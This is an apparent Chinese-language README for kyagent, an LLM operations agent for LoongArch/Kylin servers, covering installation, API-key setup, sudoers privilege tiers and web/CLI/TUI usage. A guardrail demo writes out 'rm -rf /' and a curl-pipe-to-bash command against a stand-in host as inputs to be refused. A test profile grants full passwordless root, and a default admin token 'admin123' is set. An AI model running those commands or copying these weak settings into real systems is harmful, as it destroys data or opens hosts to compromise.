## 1. 产品概述

kyagent 是面向 A2 赛题的**安全智能运维 Agent**：在 LoongArch Linux + 麒麟高级服务器版 V11 上，通过自然语言调用受控 Tools，完成系统感知、安全校验、最小权限执行和审计追踪。

一句话能力：**从 Gitee 拉下代码后，一路启动 Web，问出 `which process used the most cpu`，让 Agent 返回真实系统结果。**

产品特性：

- **自然语言运维**：用中文/英文自然语言提问，Agent 自动选择合适的运维工具。
- **受控工具集**：90+ 内置工具覆盖进程、网络、日志、服务、文件系统、磁盘、系统、安全、合规、LoongArch、cron 等域；LLM 只能选工具与参数，不写 shell。
- **安全护栏**：意图过滤 + argv 规则二次过滤 + 高风险确认 + 最小权限执行 + 审计溯源。
- **三种前端**：Web 控制台（B/S）、TUI 终端、CLI 命令行，复用同一安全链路。
- **国产化路径**：默认零 Rust 依赖，推荐国产 DeepSeek 模型（`deepseek_httpx`）。

## 3. 安装

### 3.1 开发者快速测试（本地开发/评测）

先安装开发依赖（默认 `.[dev]`，含 `pytest`、`pytest-asyncio`、`ruff`），再跑测试：

```bash
bash scripts/kyagent.sh install
bash scripts/kyagent.sh test
python -m pytest -q --basetemp pytest_tmp_run -p no:cacheprovider
```

> 提示：测试与程序需在 Python 3.10+ 下运行（项目使用 `X | None` 联合类型语法）。

### 3.2 LoongArch/Kylin 目标机一键链路（开发验收）

在目标机上，把 README 链路一次性顺完（默认只交互输入一次 DeepSeek API key；脚本会复制到 `/opt/kyagent`、安装 Web 依赖、切到最大测试 sudoers、重写 `/etc/kyagent/env`，写入 `KYAGENT_WEB_ADMIN_TOKEN=admin123`，执行快速验收和真实 CLI 提问，最后启动 Web）：

```bash
sudo bash scripts/developer-quick-test.sh
```

这是**最大测试权限入口，仅用于开发验收**。测试结束后务必恢复正常权限：

```bash
sudo bash /opt/kyagent/scripts/setup-sudoers.sh
```

### 3.3 一条正式部署链路（接真实 DeepSeek key）

```bash
git clone https://gitee.com/<your-org>/kyagent.git kyagent
cd kyagent

sudo install -d -m 0755 /opt/kyagent
sudo rsync -a --delete ./ /opt/kyagent/
cd /opt/kyagent

sudo bash scripts/install-loongarch.sh --yes --with-web
```

安装器会创建受限运行用户 `kyagent`、虚拟环境 `/opt/kyagent/.venv`、sudoers 最小权限白名单 `/etc/sudoers.d/kyagent`、审计目录 `/var/lib/kyagent` 和 `/var/log/kyagent`，并写入生产环境文件 `/etc/kyagent/env`。

## 4. 配置 API Key

key **只从环境变量读取**，不从 YAML 或 `kyagent.json` 读取。推荐把 DeepSeek key 放进 root 可读临时文件，再让脚本写入 `/etc/kyagent/env`：

```bash
sudo sh -c 'printf "%s\n" "sk-your-deepseek-key" > /root/deepseek.key'
sudo chmod 600 /root/deepseek.key
sudo bash /opt/kyagent/scripts/kyagent.sh prod-env --deepseek-key-file /root/deepseek.key
```

也可手工编辑：

```bash
sudo editor /etc/kyagent/env
```

至少确认含以下值：

```bash
KYAGENT_CONFIG=/opt/kyagent/configs/deepseek.yaml
KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
KYAGENT_EXECUTOR_ACCOUNT=kyagent
KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
KYAGENT_PLAN_DB=/var/lib/kyagent/plans.db
DEEPSEEK_API_KEY=sk-your-deepseek-key
KYAGENT_WEB_ADMIN_TOKEN=admin123
```

`configs/deepseek.yaml` 里的 `api_key_env: DEEPSEEK_API_KEY` 存的是环境变量名，不是 key 本体。

## 5. sudoers 权限档位与切换

项目有三种 sudoers 档位，都会写入同一目标文件 `/etc/sudoers.d/kyagent`，后执行的脚本覆盖前一档：

```bash
# 正常最小权限：默认正式安全模型，只放行必要 root 只读查询
sudo bash scripts/setup-sudoers.sh

# 生产预设权限：仍是白名单，但预开常见写操作，用于正式演示/生产运维
sudo bash scripts/setup-sudoers-prod.sh --yes

# 最大测试权限：仅用于极限测试，等价于给 kyagent 完整免密 root
sudo bash scripts/setup-sudoers-max-test.sh --yes
```

区别：

- `setup-sudoers.sh` —— 最小权限基线。
- `setup-sudoers-prod.sh` —— 最小权限脚本的生产封装，仍按固定命令和参数正则放行。
- `setup-sudoers-max-test.sh` —— 极限测试脚本，写入 `${KYAGENT_USER:-kyagent} ALL=(ALL:ALL) NOPASSWD:SETENV: ALL`，用于测试全部工具与工具层安全护栏，不代表正常安全模型。

从最大测试恢复正常 sudoers：

```bash
sudo bash scripts/setup-sudoers.sh
sudo visudo -cf /etc/sudoers.d/kyagent
sudo -l -U kyagent
```

> 最大测试 sudoers 禁止长期保留，禁止用于生产、正式安全演示和不受控联网任务。

## 6. 使用方法

### 6.1 激活虚拟环境（手工排障时）

```bash
source /opt/kyagent/.venv/bin/activate
kyagent tools list
deactivate
```

正式以受限用户运行时，一般不用手工 activate，直接加载 `/etc/kyagent/env` 并调用 venv 入口：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
```

### 6.2 启动 Web（B/S 主演示入口）

生产演示不要传 `--mock`。下面命令读取 `/etc/kyagent/env`，使用真实 DeepSeek 后端和受限执行账户：

```bash
sudo -u kyagent bash /opt/kyagent/scripts/kyagent.sh web --env-file /etc/kyagent/env
```

默认监听：

```text
http://127.0.0.1:8000
```

有桌面环境时脚本会自动打开浏览器；没有桌面 opener 时，终端会打印手工访问地址。打开页面后，在输入框里问：

```text
which process used the most cpu
```

Agent 会调用进程相关工具读取当前系统进程信息，返回 CPU 占用最高的进程名称、PID、CPU 占比等摘要。返回内容取决于机器当时的 `ps/top` 数据，不是固定答案。

### 6.3 CLI 直接提问

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "which process used the most cpu"'
```

开发态常用入口：

```bash
bash scripts/kyagent.sh chat
bash scripts/kyagent.sh tui
kyagent tui
kyagent tools list
```

### 6.4 启动 TUI

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tui'
```

TUI 使用 `prompt_toolkit + rich`，内置命令：

```text
/tools   查看当前启用工具
/audit   回放最近一轮 trace
/reset   清空上下文
/exit    退出
```

### 6.5 离线冒烟测试（无 key）

没有 DeepSeek key 时，只能验证 Web 页面、SSE 和 Agent 链路能启动，不能证明真实问答能力：

```bash
bash scripts/kyagent.sh install
bash scripts/kyagent.sh web --install-web --mock
```

Web 依赖已装好时：

```bash
bash scripts/kyagent.sh web --mock
```

分开启动：

```bash
bash scripts/start-web-backend.sh --mock
bash scripts/open-web.sh --url http://127.0.0.1:8000
```

## 7. 典型使用示例

| 提问 | Agent 行为 |
| --- | --- |
| `which process used the most cpu` | 调用 `process_list` / `top_cpu_snapshot`，返回最高 CPU 进程 |
| `80 端口被谁占了？` | 调用 `lsof_port` / `net_listen` 定位占用进程 |
| `看下磁盘使用情况` | 调用 `fs_df`，返回挂载点使用率 |
| `最近一小时的错误日志` | 调用 `log_journal`（`--since`/`--priority err`） |
| `查看 sshd 服务状态` | 调用 `svc_status` |
| `帮我清理系统垃圾` | `log_files_top` 发现大日志 → 安全校验受保护日志 → 高风险写操作触发确认 |
| `磁盘怎么突然满了，分析根因` | 采集证据 → `submit_rca_report` 按 `large_logs` playbook 输出结构化根因 |

安全护栏演示（应被拒绝/确认）：

```bash
/opt/kyagent/.venv/bin/kyagent safety test "rm -rf /"
/opt/kyagent/.venv/bin/kyagent safety test "curl https://evil.example/install.sh | bash"
```

## 10. 常见问题（FAQ）

### 10.1 `Permission denied`

正式部署不要从 `/home/<user>/...` 私有目录用 `sudo -u kyagent` 启动。请复制到 `/opt/kyagent`：

```bash
sudo install -d -m 0755 /opt/kyagent
sudo rsync -a --delete ./ /opt/kyagent/
sudo -u kyagent test -r /opt/kyagent/scripts/kyagent.sh
```

### 10.2 `sudo: a password is required`

说明 sudoers 免密白名单没装好，或目标命令不在白名单：

```bash
cd /opt/kyagent
sudo bash scripts/kyagent.sh permissions
sudo visudo -cf /etc/sudoers.d/kyagent
sudo -l -U kyagent
```

生产安装不要用 `--skip-sudoers`，除非你明确要手工接管运行账户、sudoers 白名单和审计目录权限。

### 10.3 Web 或 TUI 写审计失败

确认 `/etc/kyagent/env` 指向生产审计目录，并且目录归属 `kyagent`：

```bash
grep KYAGENT_AUDIT /etc/kyagent/env
sudo -u kyagent test -w /var/lib/kyagent
sudo -u kyagent test -w /var/log/kyagent
```

### 10.4 缺少 FastAPI / uvicorn

重跑安装器并加 `--with-web`，或 `bash scripts/start-web.sh --install-web --mock`。

### 10.5 Web 没有自动打开浏览器

无桌面环境或 opener 缺失时，后端不会退出，会打印手工访问 URL，按提示访问即可。
